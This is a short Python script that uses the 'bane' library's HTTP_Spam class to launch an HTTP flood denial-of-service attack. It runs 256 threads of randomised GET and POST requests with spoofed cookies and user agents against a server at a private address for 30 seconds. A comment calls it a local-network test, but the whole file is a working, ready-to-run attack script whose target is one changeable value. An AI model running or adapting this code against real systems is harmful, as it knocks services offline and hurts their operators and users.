from bane.ddos import HTTP_Spam

def main():
    try:
        # Create an instance of HTTP_Spam
        http_spam = HTTP_Spam(
            u="192.168.1.147",  # Target URL (This test was done on a local network)
            p=8080,  # Port of the target server
            cookie="SessionID=12345",  # Custom cookies
            user_agents=["Mozilla/5.0", "CustomUserAgent/1.0"],  # User-Agent headers
            method=3,  # Use random HTTP methods (GET or POST)
            paths=["/", "/path"],  # Paths to target
            threads_daemon=True,  # Set threads as daemons
            threads=256,  # Number of threads
            post_min=5,  # Minimum number of POST requests per round
            post_max=10,  # Maximum number of POST requests per round
            post_field_min=50,  # Minimum length of POST request fields
            post_field_max=100,  # Maximum length of POST request fields
            timeout=5,  # Timeout for HTTP requests
            round_min=1000,  # Minimum number of rounds
            round_max=10000,  # Maximum number of rounds
            interval=0.001,  # Interval between requests
            duration=30,  # Duration of the attack in seconds
            tor=False,  # Do not use Tor for requests
            ssl_on=False,  # SSL/TLS not enabled
            logs=True  # Enable logging
        )

        print("[*] Starting HTTP spamming...")
        http_spam.attack()  # Launch the HTTP spamming attack

        import time
        time.sleep(30)  # Let it run for the specified duration

        # Stop the attack manually if needed
        print("[*] Stopping HTTP spamming...")
        http_spam.stop = True  # Termination of the attack

        print("[*] HTTP spamming stopped.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")

if __name__ == "__main__":
    main()
